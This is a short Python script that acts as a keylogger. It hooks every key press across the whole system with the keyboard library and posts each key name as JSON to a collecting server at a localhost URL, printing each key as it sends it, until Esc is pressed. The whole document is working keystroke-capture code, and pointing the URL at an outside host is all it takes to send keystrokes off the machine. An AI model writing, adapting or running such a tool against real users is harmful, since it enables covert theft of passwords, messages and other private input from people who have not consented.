import keyboard
import requests
import json

server_url = "http://localhost:5000/key"

def on_key_event(event):
    if event.event_type == keyboard.KEY_DOWN:
        key = event.name
        print(f"Sending key: {key}")

        data = {'key':key}
        response = requests.post(server_url, json=data)
        
        if response.status_code == 200:
            print("Key sent successfully.")
        else:
            print(f"Error sending key: {response.status_code}")


keyboard.hook(on_key_event)
keyboard.wait('esc')
